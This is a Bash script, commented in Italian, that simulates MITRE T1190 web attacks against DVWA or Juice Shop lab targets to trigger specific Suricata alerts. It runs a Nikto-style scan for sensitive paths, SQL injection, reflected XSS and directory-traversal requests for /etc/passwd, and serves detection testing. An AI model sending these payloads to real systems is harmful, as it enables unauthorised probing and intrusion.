#!/usr/bin/env bash
# ============================================================
#  Simulazione: T1190 — Exploit Public-Facing Application
#  MITRE ATT&CK: Initial Access > Exploit Public-Facing Application
#  Target: DVWA (http://TARGET/dvwa) o Juice Shop
# ============================================================
set -euo pipefail

TARGET="${1:-172.20.0.10}"
PORT="${2:-8080}"
BASE="http://$TARGET:$PORT"
YLW='\033[1;33m'; GRN='\033[0;32m'; BLU='\033[0;34m'; NC='\033[0m'

step() { echo -e "\n${GRN}[►] $*${NC}"; }
info() { echo -e "    ${BLU}$*${NC}"; }

echo -e "${YLW}╔═══════════════════════════════════════════════╗"
echo    "║  MITRE T1190 — Web Application Attacks       ║"
echo -e "╚═══════════════════════════════════════════════╝${NC}"

step "1/4 — Reconnaissance"
info "User-Agent: Nikto → trigger SID 9000020"
if command -v nikto >/dev/null 2>&1; then
  nikto -h "$BASE" -maxtime 30s -output /tmp/nikto-report.txt 2>/dev/null | tail -10
else
  # Curl fallback: scanner-style requests with Nikto UA trigger SID 9000020
  echo -e "    ${YLW}nikto non trovato — uso curl con User-Agent nikto${NC}"
  curl -sf -o /dev/null -A "Mozilla/5.0 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)" \
    "$BASE/" 2>/dev/null || true
  for path in /admin /.env /config.php /backup.sql /phpinfo.php /server-status; do
    curl -sf -o /dev/null -m 2 "$BASE$path" 2>/dev/null || true
  done
fi
sleep 2

step "2/4 — SQL Injection (payload classico)"
info "Payload: ' OR '1'='1 → trigger SID 9000030"
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  "$BASE/login?user=%27+OR+%271%27%3D%271&pass=x"
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  "$BASE/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%23&Submit=Submit"
sleep 1

step "3/4 — XSS Reflected"
info "Payload: <script>alert(1)</script> → trigger SID 9000031"
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  "$BASE/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
sleep 1

step "4/4 — Directory Traversal"
info "Payload: ../../../etc/passwd → trigger SID 9000032"
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  "$BASE/vulnerabilities/fi/?page=../../../etc/passwd"
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  "$BASE/../../../etc/passwd"

echo
echo "  Alert attesi : Suricata SID 9000020, 9000030, 9000031, 9000032"
echo "  Tattica      : Initial Access / Reconnaissance"
echo "  Tecnica      : T1190, T1595.002"
echo -e "\n${GRN}Simulazione web attack completata.${NC}"
